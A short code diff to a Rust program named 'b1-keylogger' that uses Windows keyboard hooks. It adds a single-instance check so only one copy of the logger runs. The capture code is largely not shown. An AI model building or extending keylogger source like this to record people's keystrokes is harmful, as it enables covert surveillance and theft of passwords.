@@ -2,13 +2,16 @@
 extern crate chrono;
 extern crate user32;
 extern crate winapi;
+extern crate single_instance;
 
+use single_instance::SingleInstance;
 use chrono::prelude::*;
 use std::cell::RefCell;
 use std::fs::File;
 use std::fs::OpenOptions;
 use std::io::prelude::*;
 use std::io::Error;
+use std::process;
 use winapi::shared::minwindef::{BOOL, FALSE, TRUE};
 use winapi::shared::windef::{HHOOK, HHOOK__};
 use winapi::um::errhandlingapi::GetLastError;
@@ -22,6 +25,12 @@ const WM_KEYDOWN: usize = 0x0100;
 static mut hook_id: Option<HHOOK> = None;
 
 fn main() {
+    let instance = SingleInstance::new("b1-keylogger").unwrap();
+    //assert!(instance.is_single());
+    if !instance.is_single() {
+        println!("Process is already running, exit...");
+        process::exit(1);
+    }
     unsafe {
         println!("before hook");
 
